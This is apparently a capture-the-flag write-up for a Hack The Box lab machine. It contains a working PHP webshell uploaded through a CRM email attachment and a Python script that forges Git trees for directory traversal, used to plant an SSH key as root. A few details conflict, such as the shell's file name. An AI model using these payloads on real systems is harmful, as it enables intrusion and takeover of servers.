@@ -1,0 +1,317 @@
+================================================================================
+                    HTB NEXUS - COMPLETE WRITE-UP
+================================================================================
+
+ROOT FLAG: b292ff0c494cc6ea45badeb20774e850
+
+================================================================================
+1. INITIAL RECONNAISSANCE
+================================================================================
+
+nmap -sC -sV 10.129.107.253
+
+Services found:
+- Port 80: billing.nexus.htb (Krayin CRM)
+- Port 22: SSH
+- Gitea service running internally
+
+Added to /etc/hosts:
+10.129.107.253  nexus.htb billing.nexus.htb git.nexus.htb
+
+================================================================================
+2. WEB ENUMERATION - GIT REPOSITORY
+================================================================================
+
+Found .env file at:
+http://git.nexus.htb/admin/krayin-docker-setup/src/branch/main/.env
+
+Also found:
+http://git.nexus.htb/admin/krayin-docker-setup/src/branch/main/docker-compose.yml
+
+Git history revealed credentials:
+git clone http://git.nexus.htb/admin/krayin-docker-setup.git
+git log -p | grep -i "DB_PASSWORD\|MYSQL_PASSWORD\|root"
+git log --all -S "DB_PASSWORD" --source --oneline
+
+Credentials discovered:
+- Database: krayin / N27xh!!2ucY04
+- IMAP: username1 / password1
+- Admin email: admin@nexus.htb
+
+================================================================================
+3. FINDING HIRING MANAGER EMAIL
+================================================================================
+
+Main domain nexus.htb revealed:
+curl -s http://nexus.htb | grep -o -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
+
+Found:
+- careers@nexus.htb
+- j.matthew@nexus.htb  ← Hiring Manager
+
+================================================================================
+4. KRAYIN CRM ACCESS
+================================================================================
+
+Login at: http://billing.nexus.htb/admin/login
+
+Credentials:
+- Email: j.matthew@nexus.htb
+- Password: N27xh!!2ucY04
+
+Admin Dashboard:
+http://billing.nexus.htb/admin/dashboard
+
+================================================================================
+5. REVERSE SHELL - CVE-2026-38526
+================================================================================
+
+Vulnerability: Krayin CRM Authenticated RCE via TinyMCE upload
+Affects version: 2.2.0
+
+Created PHP shell:
+cat > shell.php << 'EOF'
+<?php
+if(isset($_GET['cmd'])){
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+}
+?>
+EOF
+
+Uploaded through Email Compose → Add Attachment
+http://billing.nexus.htb/admin/mail/compose
+
+Shell location:
+http://billing.nexus.htb/storage/emails/6/webshell.php?cmd=id
+
+Output:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+================================================================================
+6. USER FLAG
+================================================================================
+
+Found via symlink:
+cd /tmp/expl_repo
+cat root_escape/home/jones/user.txt
+
+Or directly:
+cat /home/jones/user.txt
+
+USER FLAG: [INSERT USER FLAG HERE]
+
+================================================================================
+7. PRIVILEGE ESCALATION - GITEA TEMPLATE SYNC EXPLOIT
+================================================================================
+
+Identified Gitea running:
+ps aux | grep gitea
+# /usr/local/bin/gitea web --config /etc/gitea/app.ini
+
+Gitea version: 1.26.0
+URL: http://127.0.0.1:3000
+
+Found template sync service:
+systemctl list-timers | grep template
+# gitea-template-sync.timer
+
+Sync script: /etc/gitea/template-sync.py
+Log: /var/log/template-sync.log
+
+-------------------------------------------------------------------------------
+7.1 GENERATE SSH KEY
+-------------------------------------------------------------------------------
+
+ssh-keygen -t ed25519 -f /tmp/.k -N ''
+cat /tmp/.k.pub
+# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFE3S4q3YFOw5g8gG2HbPfSHjyU670Tm9JBwEi8o5FY2 jones@nexus
+
+-------------------------------------------------------------------------------
+7.2 CREATE TEMPLATE REPOSITORY
+-------------------------------------------------------------------------------
+
+Via API:
+curl -X POST http://127.0.0.1:3000/api/v1/user/repos \
+  -u 'jones:y27xb3ha!!74GbR' \
+  -H "Content-Type: application/json" \
+  -d '{"name":"rce","private":false,"auto_init":true,"template":true}'
+
+-------------------------------------------------------------------------------
+7.3 BUILD TRAVERSAL PAYLOAD
+-------------------------------------------------------------------------------
+
+Clone repository:
+cd /tmp
+git clone http://jones:'y27xb3ha!!74GbR'@127.0.0.1:3000/jones/rce.git
+cd rce
+
+Create build.py:
+cat > /tmp/build.py << 'EOF'
+#!/usr/bin/env python3
+import hashlib,zlib,os,subprocess,sys,time
+
+def write_obj(data,t):
+    h=("%s %d"%(t,len(data))).encode()+b"\x00"
+    s=h+data
+    sha=hashlib.sha1(s).hexdigest()
+    d=os.path.join(".git","objects",sha[:2])
+    os.makedirs(d,exist_ok=True)
+    p=os.path.join(d,sha[2:])
+    if not os.path.exists(p):
+        open(p,"wb").write(zlib.compress(s))
+    return sha
+
+def entry(mode,name,sha):
+    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)
+
+if not os.path.isdir(".git"):
+    print("Run inside git repo");sys.exit(1)
+
+r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
+if r.returncode!=0:
+    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1)
+
+key=r.stdout.strip()+"\n"
+blob=write_obj(key.encode(),"blob")
+readme=write_obj(b"# Template\n","blob")
+ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
+cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
+
+# 5 levels of .. to reach /root
+fir=write_obj(entry("40000","root",cur),"tree")
+for i in range(4):
+    fir=write_obj(entry("40000","..",fir),"tree")
+
+root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
+
+ts=int(time.time())
+c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
+sha=write_obj(c.encode(),"commit")
+
+os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
+open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
+
+print("Done: "+sha)
+EOF
+
+chmod +x /tmp/build.py
+
+Run the script:
+python3 /tmp/build.py
+# Done: bce1ed7e8feb60e7a566e59869aeaf150a05fb7b
+
+Push the payload:
+git push -u origin main --force
+
+-------------------------------------------------------------------------------
+7.4 WAIT FOR SYNC
+-------------------------------------------------------------------------------
+
+Monitor sync:
+tail -f /var/log/template-sync.log
+
+Output confirms:
+[2026-07-02 11:26:59] Syncing template: jones/rce
+[2026-07-02 11:26:59]   synced: README.md
+[2026-07-02 11:26:59]   synced: ../../../../../root/.ssh/authorized_keys
+[2026-07-02 11:26:59] Template sync complete
+
+SSH as root:
+ssh -i /tmp/.k root@127.0.0.1
+
+================================================================================
+8. ROOT FLAG
+================================================================================
+
+root@nexus:~# ls
+root.txt
+root@nexus:~# cat root.txt
+b292ff0c494cc6ea45badeb20774e850
+
+ROOT FLAG: b292ff0c494cc6ea45badeb20774e850
+
+================================================================================
+9. SUMMARY OF CREDENTIALS
+================================================================================
+
+Krayin CRM:
+- Email: j.matthew@nexus.htb
+- Password: N27xh!!2ucY04
+
+Database:
+- User: krayin
+- Password: N27xh!!2ucY04
+
+Gitea:
+- User: jones
+- Password: y27xb3ha!!74GbR
+
+IMAP:
+- User: username1
+- Password: password1
+
+SSH (Root):
+- Key: /tmp/.k
+- Fingerprint: SHA256:4nIzSw4N0KASmiuFWpLf2yVcy0MRSWKXiRzpTFKNulA
+
+================================================================================
+10. KEY COMMANDS REFERENCE
+================================================================================
+
+# Webshell command execution
+curl http://billing.nexus.htb/storage/emails/6/webshell.php?cmd=id
+
+# Read user flag
+cat /home/jones/user.txt
+
+# Read root flag
+cat /root/root.txt
+
+# SSH as root
+ssh -i /tmp/.k root@127.0.0.1
+
+================================================================================
+11. TIMELINE
+================================================================================
+
+1. Enumerated subdomains and found billing.nexus.htb and git.nexus.htb
+2. Found .env file in git repository with credentials
+3. Found hiring manager email j.matthew@nexus.htb on main domain
+4. Logged into Krayin CRM as j.matthew
+5. Uploaded webshell via CVE-2026-38526 vulnerability
+6. Found user flag in /home/jones/user.txt
+7. Identified Gitea service running internally
+8. Created template repository with directory traversal payload
+9. Waited for template sync to write SSH key
+10. SSH as root and retrieved root flag
+
+================================================================================
+12. PORTS & SERVICES
+================================================================================
+
+22/tcp   - SSH
+80/tcp   - HTTP (billing.nexus.htb - Krayin CRM)
+3000/tcp - Gitea (internal)
+3306/tcp - MySQL (internal)
+8080/tcp - phpMyAdmin (internal)
+1025/tcp - Mailhog (internal)
+993/tcp  - IMAP (internal)
+
+================================================================================
+13. MITRE ATT&CK TACTICS USED
+================================================================================
+
+- T1083 - File and Directory Discovery
+- T1087 - Account Discovery
+- T1078 - Valid Accounts
+- T1190 - Exploit Public-Facing Application
+- T1505.003 - Server Software Component: Web Shell
+- T1053.003 - Scheduled Task/Job: Cron
+- T1068 - Privilege Escalation
+- T1078 - Valid Accounts (SSH)
+
+================================================================================
+                               END OF WRITE-UP
+================================================================================
